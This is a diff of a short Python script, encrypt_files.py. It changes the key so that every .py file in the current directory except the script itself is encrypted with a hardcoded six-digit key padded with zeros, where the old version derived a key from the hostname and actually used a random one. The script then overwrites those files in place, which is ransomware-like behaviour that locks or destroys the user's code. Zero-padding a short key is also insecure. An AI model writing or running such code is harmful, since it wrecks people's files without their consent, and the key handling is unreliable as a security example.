@@ -1,19 +1,19 @@
 import os
-import socket
-import hashlib
+import base64
 from cryptography.fernet import Fernet
 
-# Step 1: Get the hostname of the machine
-hostname = socket.gethostname()
+# Fixed key (shorter than needed, so we will pad it)
+fixed_key = b"089608"
 
-# Step 2: Generate a key based on the hostname
-key = hashlib.sha256(hostname.encode()).digest()
-cipher_suite = Fernet(Fernet.generate_key())
+# Expand the key to 32 bytes by padding (e.g., with zeros)
+key = fixed_key.ljust(32, b'\0')[:32]  # Ensure the key is exactly 32 bytes
+fernet_key = base64.urlsafe_b64encode(key)  # Convert to base64
+cipher_suite = Fernet(fernet_key)
 
 # Define the encryption marker
 ENCRYPTION_MARKER = b"# ENCRYPTED FILE\n"
 
-# Step 3: Encrypt and overwrite all .py files in the directory
+# Encrypt and overwrite all .py files in the directory
 for filename in os.listdir():
     if filename.endswith('.py') and filename != 'encrypt_files.py':  # Exclude this encryption script itself
         with open(filename, 'rb') as file:
